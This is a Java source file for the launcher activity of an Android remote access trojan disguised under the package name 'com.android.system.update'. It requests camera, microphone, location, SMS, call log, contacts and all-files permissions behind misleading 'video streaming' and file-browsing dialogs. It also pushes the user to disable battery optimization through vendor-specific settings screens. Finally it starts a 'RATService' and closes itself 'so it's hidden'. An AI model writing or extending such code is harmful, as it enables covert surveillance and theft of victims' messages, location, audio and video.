package com.android.system.update;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.PowerManager;
import android.provider.Settings;
import android.util.Log;
import android.widget.Toast;

import androidx.activity.EdgeToEdge;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

public class MainActivity extends AppCompatActivity {
    
    private static final String TAG = "MainActivity";
    private static final int PERMISSION_REQUEST_CODE = 100;
    private static final int BATTERY_OPTIMIZATION_REQUEST_CODE = 200;
    private static final int MANAGE_STORAGE_REQUEST_CODE = 300;
    private static final int VIDEO_PERMISSION_REQUEST_CODE = 400;
    
    // Base permissions for all Android versions
    private final String[] basePermissions = {
        Manifest.permission.CAMERA,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.READ_SMS,
        Manifest.permission.SEND_SMS,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.FOREGROUND_SERVICE,
        Manifest.permission.POST_NOTIFICATIONS,
        Manifest.permission.SCHEDULE_EXACT_ALARM,
        Manifest.permission.USE_EXACT_ALARM,
        Manifest.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
    };
    
    // Android 10+ (API 29+) specific foreground service permissions
    private final String[] android10Permissions = {
        Manifest.permission.FOREGROUND_SERVICE_CAMERA,
        Manifest.permission.FOREGROUND_SERVICE_MICROPHONE,
        Manifest.permission.FOREGROUND_SERVICE_LOCATION
    };
    
    // Android 13+ (API 33+) specific permissions
    private final String[] android13Permissions = {
        android.Manifest.permission.READ_MEDIA_IMAGES,
        android.Manifest.permission.READ_MEDIA_VIDEO,
        android.Manifest.permission.READ_MEDIA_AUDIO,
        android.Manifest.permission.NEARBY_WIFI_DEVICES,
        android.Manifest.permission.BLUETOOTH_CONNECT,
        android.Manifest.permission.BLUETOOTH_SCAN,
        android.Manifest.permission.BODY_SENSORS
    };
    
    // Android 12 (API 31-32) specific permissions
    private final String[] android12Permissions = {
        android.Manifest.permission.BLUETOOTH_CONNECT,
        android.Manifest.permission.BLUETOOTH_SCAN,
        android.Manifest.permission.NEARBY_WIFI_DEVICES
    };
    
    // Android 11 and below storage permissions
    private final String[] legacyStoragePermissions = {
        Manifest.permission.READ_EXTERNAL_STORAGE,
        Manifest.permission.WRITE_EXTERNAL_STORAGE
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_main);
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), (v, insets) -> {
            Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
            return insets;
        });
        
        // Log device info for debugging
        logDeviceInfo();
        
        // Check and request permissions
        checkAndRequestPermissions();
    }
    
    private void logDeviceInfo() {
        Log.d(TAG, "================ DEVICE INFO ================");
        Log.d(TAG, "Android Version: " + Build.VERSION.RELEASE + " (API " + Build.VERSION.SDK_INT + ")");
        Log.d(TAG, "Device: " + Build.MANUFACTURER + " " + Build.MODEL);
        Log.d(TAG, "==============================================");
    }
    
    private void checkAndRequestPermissions() {
        List<String> permissionsNeeded = new ArrayList<>();
        
        // First, check if we need MANAGE_EXTERNAL_STORAGE for Android 11+
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                requestManageStoragePermission();
                return; // Wait for the result before checking other permissions
            }
        }
        
        // Add base permissions
        for (String permission : basePermissions) {
            if (ContextCompat.checkSelfPermission(this, permission) 
                    != PackageManager.PERMISSION_GRANTED) {
                permissionsNeeded.add(permission);
                Log.d(TAG, "Base permission needed: " + permission);
            } else {
                Log.d(TAG, "Base permission already granted: " + permission);
            }
        }
        
        // Add Android 10+ foreground service permissions (CRITICAL FOR VIDEO)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            for (String permission : android10Permissions) {
                if (ContextCompat.checkSelfPermission(this, permission) 
                        != PackageManager.PERMISSION_GRANTED) {
                    permissionsNeeded.add(permission);
                    Log.d(TAG, "Android 10+ permission needed: " + permission);
                } else {
                    Log.d(TAG, "Android 10+ permission already granted: " + permission);
                }
            }
        }
        
        // Add version-specific permissions
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) { // Android 13+
            for (String permission : android13Permissions) {
                if (ContextCompat.checkSelfPermission(this, permission) 
                        != PackageManager.PERMISSION_GRANTED) {
                    permissionsNeeded.add(permission);
                    Log.d(TAG, "Android 13+ permission needed: " + permission);
                }
            }
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) { // Android 12
            for (String permission : android12Permissions) {
                if (ContextCompat.checkSelfPermission(this, permission) 
                        != PackageManager.PERMISSION_GRANTED) {
                    permissionsNeeded.add(permission);
                    Log.d(TAG, "Android 12 permission needed: " + permission);
                }
            }
            // Add storage permissions for Android 12
            for (String permission : legacyStoragePermissions) {
                if (ContextCompat.checkSelfPermission(this, permission) 
                        != PackageManager.PERMISSION_GRANTED) {
                    permissionsNeeded.add(permission);
                    Log.d(TAG, "Storage permission needed: " + permission);
                }
            }
        } else { // Android 11 and below
            for (String permission : legacyStoragePermissions) {
                if (ContextCompat.checkSelfPermission(this, permission) 
                        != PackageManager.PERMISSION_GRANTED) {
                    permissionsNeeded.add(permission);
                    Log.d(TAG, "Legacy storage permission needed: " + permission);
                }
            }
        }
        
        Log.d(TAG, "Total permissions needed: " + permissionsNeeded.size());
        
        if (!permissionsNeeded.isEmpty()) {
            // Check if video permissions are missing (camera + foreground camera)
            boolean missingVideoPermissions = false;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                missingVideoPermissions = permissionsNeeded.contains(Manifest.permission.CAMERA) ||
                                         permissionsNeeded.contains(Manifest.permission.FOREGROUND_SERVICE_CAMERA);
            } else {
                missingVideoPermissions = permissionsNeeded.contains(Manifest.permission.CAMERA);
            }
            
            if (missingVideoPermissions) {
                showVideoPermissionExplanation(permissionsNeeded);
            } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                showAndroid13PermissionExplanation(permissionsNeeded);
            } else {
                // Request all missing permissions at once
                ActivityCompat.requestPermissions(this, 
                    permissionsNeeded.toArray(new String[0]), 
                    PERMISSION_REQUEST_CODE);
            }
        } else {
            Log.d(TAG, "All permissions already granted!");
            allPermissionsGranted();
        }
    }
    
    private void showVideoPermissionExplanation(List<String> permissionsNeeded) {
        StringBuilder message = new StringBuilder();
        message.append("📹 VIDEO STREAMING PERMISSIONS REQUIRED\n\n");
        message.append("To enable video streaming, this app needs:\n\n");
        
        if (permissionsNeeded.contains(Manifest.permission.CAMERA)) {
            message.append("• Camera - To capture video\n");
        }
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            if (permissionsNeeded.contains(Manifest.permission.FOREGROUND_SERVICE_CAMERA)) {
                message.append("• Background Camera - To stream video while app is in background\n");
            }
            if (permissionsNeeded.contains(Manifest.permission.FOREGROUND_SERVICE_MICROPHONE)) {
                message.append("• Background Microphone - To record audio with video\n");
            }
        }
        
        message.append("\nThese permissions are required for live video streaming features.");
        
        new AlertDialog.Builder(this)
            .setTitle("Video Streaming Permissions")
            .setMessage(message.toString())
            .setPositiveButton("Grant Permissions", (dialog, which) -> {
                ActivityCompat.requestPermissions(this, 
                    permissionsNeeded.toArray(new String[0]), 
                    VIDEO_PERMISSION_REQUEST_CODE);
            })
            .setNegativeButton("Skip Video", (dialog, which) -> {
                // Remove video permissions from the list and request others
                List<String> filteredPermissions = new ArrayList<>(permissionsNeeded);
                filteredPermissions.remove(Manifest.permission.CAMERA);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                    filteredPermissions.remove(Manifest.permission.FOREGROUND_SERVICE_CAMERA);
                    filteredPermissions.remove(Manifest.permission.FOREGROUND_SERVICE_MICROPHONE);
                }
                
                if (!filteredPermissions.isEmpty()) {
                    ActivityCompat.requestPermissions(this, 
                        filteredPermissions.toArray(new String[0]), 
                        PERMISSION_REQUEST_CODE);
                } else {
                    allPermissionsGranted();
                }
            })
            .setNeutralButton("Check Status", (dialog, which) -> {
                checkVideoPermissionsStatus();
            })
            .show();
    }
    
    private void showAndroid13PermissionExplanation(List<String> permissionsNeeded) {
        StringBuilder message = new StringBuilder();
        message.append("This app needs the following permissions:\n\n");
        
        if (permissionsNeeded.contains(android.Manifest.permission.READ_MEDIA_IMAGES) ||
            permissionsNeeded.contains(android.Manifest.permission.READ_MEDIA_VIDEO)) {
            message.append("• Photos and Videos - To access and save media files\n");
        }
        
        if (permissionsNeeded.contains(android.Manifest.permission.NEARBY_WIFI_DEVICES)) {
            message.append("• Nearby devices - To scan for Wi-Fi networks and Bluetooth devices\n");
        }
        
        if (permissionsNeeded.contains(android.Manifest.permission.POST_NOTIFICATIONS)) {
            message.append("• Notifications - To show service status\n");
        }
        
        new AlertDialog.Builder(this)
            .setTitle("Additional Permissions Required")
            .setMessage(message.toString())
            .setPositiveButton("Continue", (dialog, which) -> {
                ActivityCompat.requestPermissions(this, 
                    permissionsNeeded.toArray(new String[0]), 
                    PERMISSION_REQUEST_CODE);
            })
            .setNegativeButton("Cancel", (dialog, which) -> {
                // Try to continue with whatever permissions we have
                allPermissionsGranted();
            })
            .show();
    }
    
    private void requestManageStoragePermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            try {
                // Show explanation dialog first
                new AlertDialog.Builder(this)
                    .setTitle("Storage Permission Required")
                    .setMessage("This app needs access to all files to browse folders like " +
                               "Download, Documents, and custom folders. Please grant 'All files access' " +
                               "in the next screen.")
                    .setPositiveButton("Grant Access", (dialog, which) -> {
                        try {
                            Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                            intent.setData(Uri.parse("package:" + getPackageName()));
                            startActivityForResult(intent, MANAGE_STORAGE_REQUEST_CODE);
                        } catch (Exception e) {
                            // Fallback for devices where the above intent doesn't work
                            Intent intent = new Intent();
                            intent.setAction(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
                            startActivityForResult(intent, MANAGE_STORAGE_REQUEST_CODE);
                        }
                    })
                    .setNegativeButton("Skip", (dialog, which) -> {
                        // Continue with other permissions
                        checkAndRequestPermissions();
                    })
                    .show();
            } catch (Exception e) {
                e.printStackTrace();
                // If dialog fails, continue with other permissions
                checkAndRequestPermissions();
            }
        } else {
            // For Android 10 and below, continue with regular permissions
            checkAndRequestPermissions();
        }
    }
    
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, 
                                           @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        
        Log.d(TAG, "onRequestPermissionsResult - Request Code: " + requestCode);
        Log.d(TAG, "Permissions requested: " + Arrays.toString(permissions));
        Log.d(TAG, "Grant results: " + Arrays.toString(grantResults));
        
        if (requestCode == PERMISSION_REQUEST_CODE || requestCode == VIDEO_PERMISSION_REQUEST_CODE) {
            boolean allGranted = true;
            StringBuilder deniedPermissions = new StringBuilder();
            boolean videoPermissionsGranted = true;
            
            for (int i = 0; i < permissions.length; i++) {
                String permission = permissions[i];
                boolean granted = grantResults[i] == PackageManager.PERMISSION_GRANTED;
                
                if (!granted) {
                    allGranted = false;
                    deniedPermissions.append(getPermissionDescription(permission)).append("\n");
                    
                    // Check if video permissions were denied
                    if (permission.equals(Manifest.permission.CAMERA) ||
                        (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q && 
                         permission.equals(Manifest.permission.FOREGROUND_SERVICE_CAMERA))) {
                        videoPermissionsGranted = false;
                    }
                }
            }
            
            if (allGranted) {
                Toast.makeText(this, "All permissions granted!", Toast.LENGTH_SHORT).show();
                allPermissionsGranted();
            } else {
                String message = "Some permissions denied. ";
                if (!videoPermissionsGranted) {
                    message += "Video streaming will not work. ";
                }
                message += "Other features may still work:\n" + deniedPermissions.toString();
                
                Toast.makeText(this, message, Toast.LENGTH_LONG).show();
                
                // Check if we need to request MANAGE_EXTERNAL_STORAGE again
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    if (!Environment.isExternalStorageManager()) {
                        requestManageStoragePermission();
                        return;
                    }
                }
                
                allPermissionsGranted(); // Still try to start service with whatever permissions we have
            }
        }
    }
    
    private String getPermissionDescription(String permission) {
        switch (permission) {
            case Manifest.permission.CAMERA:
                return "• Camera (for photos and video)";
            case Manifest.permission.FOREGROUND_SERVICE_CAMERA:
                return "• Camera in background (for video streaming)";
            case Manifest.permission.FOREGROUND_SERVICE_MICROPHONE:
                return "• Microphone in background (for video audio)";
            case Manifest.permission.FOREGROUND_SERVICE_LOCATION:
                return "• Location in background";
            case android.Manifest.permission.READ_MEDIA_IMAGES:
            case android.Manifest.permission.READ_MEDIA_VIDEO:
                return "• Photos & Videos";
            case android.Manifest.permission.NEARBY_WIFI_DEVICES:
                return "• Nearby devices";
            case Manifest.permission.RECORD_AUDIO:
                return "• Microphone";
            case Manifest.permission.ACCESS_FINE_LOCATION:
            case Manifest.permission.ACCESS_COARSE_LOCATION:
                return "• Location";
            default:
                return "• " + permission.substring(permission.lastIndexOf('.') + 1);
        }
    }
    
    // Add this method to check video permissions status
    private void checkVideoPermissionsStatus() {
        boolean hasCamera = ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) 
                == PackageManager.PERMISSION_GRANTED;
        boolean hasForegroundCamera = false;
        boolean hasForegroundMic = false;
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            hasForegroundCamera = ContextCompat.checkSelfPermission(this, 
                    Manifest.permission.FOREGROUND_SERVICE_CAMERA) == PackageManager.PERMISSION_GRANTED;
            hasForegroundMic = ContextCompat.checkSelfPermission(this, 
                    Manifest.permission.FOREGROUND_SERVICE_MICROPHONE) == PackageManager.PERMISSION_GRANTED;
        }
        
        String message = "📹 VIDEO PERMISSIONS STATUS:\n\n" +
                        "Camera: " + (hasCamera ? "✅ GRANTED" : "❌ DENIED") + "\n" +
                        "Foreground Camera: " + (hasForegroundCamera ? "✅ GRANTED" : "❌ DENIED") + "\n" +
                        "Foreground Microphone: " + (hasForegroundMic ? "✅ GRANTED" : "❌ DENIED") + "\n\n";
        
        if (hasCamera && (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q || hasForegroundCamera)) {
            message += "✓ Video streaming should work!";
        } else {
            message += "✗ Video streaming will NOT work. Please grant all camera permissions.";
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                message += "\n\nOn Android 10+, you need BOTH Camera AND Foreground Camera permissions.";
            }
        }
        
        new AlertDialog.Builder(this)
            .setTitle("Video Permissions Check")
            .setMessage(message)
            .setPositiveButton("OK", null)
            .setNeutralButton("Request Again", (dialog, which) -> {
                List<String> videoPerms = new ArrayList<>();
                videoPerms.add(Manifest.permission.CAMERA);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                    videoPerms.add(Manifest.permission.FOREGROUND_SERVICE_CAMERA);
                    videoPerms.add(Manifest.permission.FOREGROUND_SERVICE_MICROPHONE);
                }
                ActivityCompat.requestPermissions(this, 
                    videoPerms.toArray(new String[0]), 
                    VIDEO_PERMISSION_REQUEST_CODE);
            })
            .show();
    }
    
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        
        if (requestCode == BATTERY_OPTIMIZATION_REQUEST_CODE) {
            // Check if user granted battery optimization exemption
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
                String packageName = getPackageName();
                
                if (pm.isIgnoringBatteryOptimizations(packageName)) {
                    Toast.makeText(this, "Battery optimization disabled. App will run more reliably.", 
                        Toast.LENGTH_LONG).show();
                }
            }
        } else if (requestCode == MANAGE_STORAGE_REQUEST_CODE) {
            // Check if user granted MANAGE_EXTERNAL_STORAGE permission
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                if (Environment.isExternalStorageManager()) {
                    Toast.makeText(this, "All files access granted!", Toast.LENGTH_SHORT).show();
                } else {
                    Toast.makeText(this, "All files access not granted. Some folders may not be accessible.", 
                        Toast.LENGTH_LONG).show();
                }
            }
            // Continue with regular permissions
            checkAndRequestPermissions();
        }
    }
    
    private void allPermissionsGranted() {
        Log.d(TAG, "All permissions flow completed, starting service");
        
        // Check video permissions one more time for logging
        checkVideoPermissionsForLogging();
        
        // All permissions granted, start service
        startRATService();
        
        // Check and request battery optimization exemption
        checkBatteryOptimization();
        
        // Open battery settings to help user whitelist the app
        openBatteryOptimizationSettings();
    }
    
    private void checkVideoPermissionsForLogging() {
        boolean hasCamera = ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) 
                == PackageManager.PERMISSION_GRANTED;
        boolean hasForegroundCamera = false;
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            hasForegroundCamera = ContextCompat.checkSelfPermission(this, 
                    Manifest.permission.FOREGROUND_SERVICE_CAMERA) == PackageManager.PERMISSION_GRANTED;
        }
        
        Log.d(TAG, "=== VIDEO PERMISSIONS FINAL CHECK ===");
        Log.d(TAG, "Camera: " + hasCamera);
        Log.d(TAG, "Foreground Camera: " + hasForegroundCamera);
        
        if (hasCamera && (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q || hasForegroundCamera)) {
            Log.d(TAG, "✅ Video streaming should work!");
        } else {
            Log.d(TAG, "❌ Video streaming will NOT work!");
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q && !hasForegroundCamera) {
                Log.d(TAG, "   Missing FOREGROUND_SERVICE_CAMERA permission");
            }
        }
        Log.d(TAG, "======================================");
    }
    
    private void checkBatteryOptimization() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            String packageName = getPackageName();
            
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                // Show a dialog explaining why user should disable battery optimization
                new AlertDialog.Builder(this)
                    .setTitle("Battery Optimization")
                    .setMessage("For the app to work properly in the background, please disable battery optimization. " +
                               "This ensures the service continues running even when the device is idle.")
                    .setPositiveButton("Disable", (dialog, which) -> {
                        requestIgnoreBatteryOptimizations();
                    })
                    .setNegativeButton("Later", null)
                    .show();
            }
        }
    }
    
    private void requestIgnoreBatteryOptimizations() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            Intent intent = new Intent();
            String packageName = getPackageName();
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                intent.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                intent.setData(Uri.parse("package:" + packageName));
                startActivityForResult(intent, BATTERY_OPTIMIZATION_REQUEST_CODE);
            }
        }
    }
    
    private void openBatteryOptimizationSettings() {
        // Wait a bit before opening battery settings (so user sees the app first)
        try {
            Thread.sleep(1000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        
        // Try manufacturer-specific battery settings first
        if (!openManufacturerBatterySettings()) {
            // Fallback to generic battery optimization settings
            try {
                Intent intent = new Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS);
                startActivity(intent);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
    
    private boolean openManufacturerBatterySettings() {
        // Xiaomi
        try {
            Intent intent = new Intent();
            intent.setClassName("com.miui.securitycenter", 
                "com.miui.powercenter.PowerSettingsActivity");
            startActivity(intent);
            return true;
        } catch (Exception e) {
            // Not Xiaomi
        }
        
        // Huawei
        try {
            Intent intent = new Intent();
            intent.setClassName("com.huawei.systemmanager", 
                "com.huawei.systemmanager.optimize.process.ProtectActivity");
            startActivity(intent);
            return true;
        } catch (Exception e) {
            // Not Huawei
        }
        
        // OPPO
        try {
            Intent intent = new Intent();
            intent.setClassName("com.oppo.oppopowermonitor", 
                "com.oppo.oppopowermonitor.MainActivity");
            startActivity(intent);
            return true;
        } catch (Exception e) {
            // Not OPPO
        }
        
        // Vivo
        try {
            Intent intent = new Intent();
            intent.setClassName("com.vivo.abe", 
                "com.vivo.abe.MainActivity");
            startActivity(intent);
            return true;
        } catch (Exception e) {
            // Not Vivo
        }
        
        // Samsung
        try {
            Intent intent = new Intent();
            intent.setClassName("com.samsung.android.lool", 
                "com.samsung.android.sm.ui.battery.BatteryActivity");
            startActivity(intent);
            return true;
        } catch (Exception e) {
            // Not Samsung
        }
        
        // OnePlus
        try {
            Intent intent = new Intent();
            intent.setClassName("com.oneplus.security", 
                "com.oneplus.security.chainlaunch.ChainLaunchConfigActivity");
            startActivity(intent);
            return true;
        } catch (Exception e) {
            // Not OnePlus
        }
        
        return false; // No manufacturer settings found
    }
    
    private void startRATService() {
        Intent serviceIntent = new Intent(this, RATService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }
        
        // Optional: Show a message
        Toast.makeText(this, "RAT Service Started", Toast.LENGTH_SHORT).show();
        
        // Close activity immediately (so it's hidden)
        finish();
    }
}
